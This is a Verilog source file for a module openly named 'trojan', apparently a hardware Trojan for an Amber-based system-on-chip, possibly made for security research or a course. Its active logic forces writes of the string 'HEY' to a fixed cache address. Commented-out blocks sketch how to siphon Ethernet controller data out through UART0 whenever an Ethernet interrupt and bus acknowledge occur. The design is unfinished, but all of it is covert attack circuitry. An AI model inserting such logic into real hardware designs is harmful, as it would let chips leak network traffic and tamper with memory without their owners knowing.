
`include "global_defines.v"

module trojan (
    input wire i_clk,
    input wire i_rst,

    // Spy on ethernet data
    input wire        i_eth_s_wb_ack,
    input wire [31:0] i_eth_s_wb_dat_r,
    input wire        i_ethmac_int,
    input wire        i_uart_int,

    // Write to uart
    output reg o_control_uart,
    output reg [31:0] o_uart_s_wb_adr,
    output reg        o_uart_s_wb_we,
    output reg [31:0] o_uart_s_wb_dat_w,
    output reg        o_uart_s_wb_stb,
	
	// Write to cache
	output reg			o_troj,
	output wire [31:0] 	o_troj_write_data,
	output wire [31:0]	o_troj_write_addr,
	output wire [31:0]  o_troj_write_addr_nxt
    );

    //reg  [32*8:0] data_cache;
    //wire [32*8:0] data_cache_nxt;
    //reg  [4:0]   data_cache_head;
    //wire [4:0]   data_cache_head_nxt;
    //reg  [4:0]   data_cache_tail;
    //wire [4:0]   data_cache_tail_nxt;

    reg         o_control_uart_nxt;
    reg [31:0]  o_uart_s_wb_adr_nxt;
    reg         o_uart_s_wb_we_nxt;
    reg [31:0]  o_uart_s_wb_dat_w_nxt;
    reg         o_uart_s_wb_stb_nxt;

    reg  uart_available;
    reg uart_available_nxt;
	
	reg cache_state = 0;
	
	assign o_troj_write_data 		= 32'h4845_5900;	/// "HEY\0"
	assign o_troj_write_addr 		= 32'h3E00_0000;
	assign o_troj_write_addr_nxt 	= 32'h3E00_0020;
    
    always @(*) begin

        uart_available_nxt = uart_available;
        if (i_uart_int) begin
            uart_available_nxt = 1;
        end
        /*
        if (uart_available) begin

        end


        if (i_eth_s_wb_ack) begin
            o_control_uart_nxt = 1;
            o_uart_s_wb_adr_nxt = AMBER_UART_DR;
            o_uart_s_wb_we_nxt  = 1;
            o_uart_s_wb_dat_w_nxt = i_eth_s_wb_dat_r;
            o_uart_s_wb_stb_nxt = 1;
        end else begin
        */
            o_control_uart_nxt = 0;
            o_uart_s_wb_adr_nxt = 0;
            o_uart_s_wb_we_nxt  = 0;
            o_uart_s_wb_dat_w_nxt = 0;
            o_uart_s_wb_stb_nxt = 0;
        //end
		
		
    end

    always @(posedge i_clk) begin
        if (i_rst) begin
            o_control_uart <= 0;
            o_uart_s_wb_adr <= 0;
            o_uart_s_wb_we <= 0;
            o_uart_s_wb_dat_w <= 0;
            o_uart_s_wb_stb <= 0;

            uart_available <= 1;
        end else begin
            o_control_uart <= o_control_uart_nxt;
            o_uart_s_wb_adr <= o_uart_s_wb_adr_nxt;
            o_uart_s_wb_we <= o_uart_s_wb_we_nxt;
            o_uart_s_wb_dat_w <= o_uart_s_wb_dat_w_nxt;
            o_uart_s_wb_stb <= o_uart_s_wb_stb_nxt;

            uart_available <= uart_available_nxt;
        end
    end

endmodule


//XXX: Put logic that does this into the module
/*
/// -------------------------------------------------------------
/// Hardware Trojan logic for outputting ETHMAC from UART0
/// -------------------------------------------------------------

wire [31:0] 			i_uart0_adr;
wire					i_uart0_we;
wire [31:0]				i_uart0_dat;
wire					i_uart0_stb;

assign i_uart0_adr = (ethmac_int && emm_wb_ack) ? AMBER_UART_DR : s_wb_adr[3];
assign i_uart0_we = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_we[3];
assign i_uart0_dat = (ethmac_int && emm_wb_ack) ? emm_wb_wdat : s_wb_dat_w[3];
assign i_uart0_stb = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_stb[3];

// Replace the appropriate signals in the UART0 instantiation
*/
